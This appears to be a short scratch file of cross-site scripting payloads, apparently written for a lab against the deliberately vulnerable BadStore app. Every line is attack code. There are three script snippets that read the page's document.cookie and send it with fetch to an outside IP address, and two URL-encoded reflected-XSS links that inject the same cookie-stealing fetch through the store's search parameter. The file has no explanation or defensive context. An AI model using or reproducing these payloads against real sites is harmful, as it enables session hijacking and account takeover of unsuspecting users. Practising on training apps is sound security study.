//<script>document.addEventListener("DOMContentLoaded", async () => {let resultado = await fetch("http://200.200.100.10:1889/", {method: 'GET',body: document.cookie, headers : {'Content-Type': 'application/x-www-form-urlencoded'}}) }); </script>

//<script>alert(await fetch("http://200.200.100.10:1889?cookie="+document.cookie))</script>

// <script>document.addEventListener("DOMContentLoaded", async () => { await fetch("http://200.200.100.10:1889?cookie="+document.cookie) })</script>

http://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=%3Ch1%3Econtenido%3C/h1%3E%3Cscript%3E%20fetch(%22http://200.200.100.10:8090?cookie=%22%2Bdocument.cookie)%20%20%3C/script%3E&action=search&x=0&y=0

http://www.bladstore.net/cgi-bin/badstore.cgi?searchquery=%3Ch1%3Econtenido%3C/h1%3E%3Cscript%3E%20fetch(%22http://200.200.100.10:1889?cookie=%22%2Bdocument.cookie)%20%20%3C/script%3E&action=search&x=0&y=0%22